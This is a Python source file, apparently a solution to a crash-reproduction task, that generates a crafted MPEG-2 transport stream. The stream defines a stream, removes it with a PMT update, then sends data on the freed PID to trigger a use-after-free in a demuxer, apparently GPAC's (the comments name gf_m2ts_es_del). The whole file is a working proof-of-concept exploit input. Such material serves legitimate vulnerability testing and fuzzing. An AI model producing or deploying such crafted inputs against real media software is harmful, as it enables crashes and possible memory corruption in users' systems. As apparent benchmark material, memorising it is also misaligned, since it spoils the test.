import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # MPEG-2 CRC32 Implementation
        def mpeg_crc32(data):
            crc = 0xFFFFFFFF
            for byte in data:
                for i in range(7, -1, -1):
                    bit = (byte >> i) & 1
                    c15 = (crc >> 31) & 1
                    crc <<= 1
                    if c15 ^ bit:
                        crc ^= 0x04C11DB7
                    crc &= 0xFFFFFFFF
            return crc

        # Helper to build 188-byte TS packet
        def build_ts_packet(pid, payload, counter, pusi=0):
            header = bytearray()
            header.append(0x47) # Sync byte
            
            # TEI(1) | PUSI(1) | Priority(1) | PID(13)
            # 0 | pusi | 0 | pid_high
            val = (0x40 if pusi else 0) | ((pid >> 8) & 0x1F)
            header.append(val)
            header.append(pid & 0xFF)
            
            # Scramble(2) | Adapt(2) | Counter(4)
            # Adapt=01 (Payload only), Counter=counter
            header.append(0x10 | (counter & 0x0F))
            
            # Stuffing with 0xFF
            pkt = header + payload
            if len(pkt) < 188:
                pkt += b'\xFF' * (188 - len(pkt))
            return pkt[:188]

        packets = []

        # -----------------------------------------------------------
        # Packet 1: PAT (Program Association Table)
        # Defines Program 1 mapping to PID 0x100
        # -----------------------------------------------------------
        # TableID(0x00), SectionLen(13), ProgNum(1), Ver(0), Sec(0), Last(0), Prog(1)->PID(0x100)
        pat_sec = bytearray([
            0x00,                   # Table ID
            0xB0, 0x0D,             # Section Len 13
            0x00, 0x01,             # Prog Num 1
            0xC1,                   # Version 0, Current
            0x00, 0x00,             # SecNum, LastSecNum
            0x00, 0x01,             # Program 1
            0xE1, 0x00              # PID 0x100 (0xE000 | 0x0100)
        ])
        pat_sec += struct.pack('>I', mpeg_crc32(pat_sec))
        packets.append(build_ts_packet(0, b'\x00' + pat_sec, 0, pusi=1))

        # -----------------------------------------------------------
        # Packet 2: PMT (Program Map Table) Version 0
        # PID 0x100. Defines ES PID 0x200 with Stream Type 0x11 (MPEG-4 SL)
        # -----------------------------------------------------------
        # TableID(0x02), SectionLen(18), Prog(1), Ver(0), Sec(0), Last(0), PCR(0x1FF), PILen(0), ES[Type 0x11, PID 0x200, InfoLen 0]
        pmt_sec = bytearray([
            0x02,                   # Table ID
            0xB0, 0x12,             # Len 18
            0x00, 0x01,             # Prog 1
            0xC1,                   # Ver 0, Current
            0x00, 0x00,             # SecNum, Last
            0xE1, 0xFF,             # PCR PID 0x1FF
            0xF0, 0x00,             # Prog Info Len 0
            0x11,                   # Stream Type 0x11 (MPEG-4 SL-packetized)
            0xE2, 0x00,             # ES PID 0x200
            0xF0, 0x00              # ES Info Len 0
        ])
        pmt_sec += struct.pack('>I', mpeg_crc32(pmt_sec))
        packets.append(build_ts_packet(0x100, b'\x00' + pmt_sec, 0, pusi=1))

        # -----------------------------------------------------------
        # Packet 3: ES Data
        # PID 0x200. Start of PES packet.
        # This initializes the stream context in the demuxer.
        # -----------------------------------------------------------
        # PES Header: StartCode(000001E0), Len(0), Flags(80..), HeaderLen(0)
        es_payload = b'\x00\x00\x01\xE0\x00\x00\x80\x00\x00' + b'\xAA'*50
        packets.append(build_ts_packet(0x200, es_payload, 0, pusi=1))

        # -----------------------------------------------------------
        # Packet 4: PMT Version 1 (Update)
        # PID 0x100. Updates Program 1.
        # CRITICALLY: Removes ES PID 0x200 (Empty ES loop).
        # This triggers `gf_m2ts_es_del` for the active stream.
        # -----------------------------------------------------------
        # TableID(0x02), SectionLen(13), Prog(1), Ver(1), Sec(0), Last(0), PCR(0x1FF), PILen(0)
        pmt2_sec = bytearray([
            0x02,                   # Table ID
            0xB0, 0x0D,             # Len 13
            0x00, 0x01,             # Prog 1
            0xC3,                   # Ver 1 (bits 00001), Current
            0x00, 0x00,             # SecNum, Last
            0xE1, 0xFF,             # PCR PID 0x1FF
            0xF0, 0x00              # Prog Info Len 0
        ])
        pmt2_sec += struct.pack('>I', mpeg_crc32(pmt2_sec))
        packets.append(build_ts_packet(0x100, b'\x00' + pmt2_sec, 1, pusi=1))

        # -----------------------------------------------------------
        # Packet 5 & 6: Data on freed PID
        # PID 0x200.
        # Sending data on the PID that was just freed in the previous packet.
        # If the demuxer holds a dangling reference (Use-After-Free), this crashes.
        # -----------------------------------------------------------
        packets.append(build_ts_packet(0x200, b'\xBB'*100, 1, pusi=0))
        packets.append(build_ts_packet(0x200, b'\xCC'*100, 2, pusi=0))

        return b''.join(packets)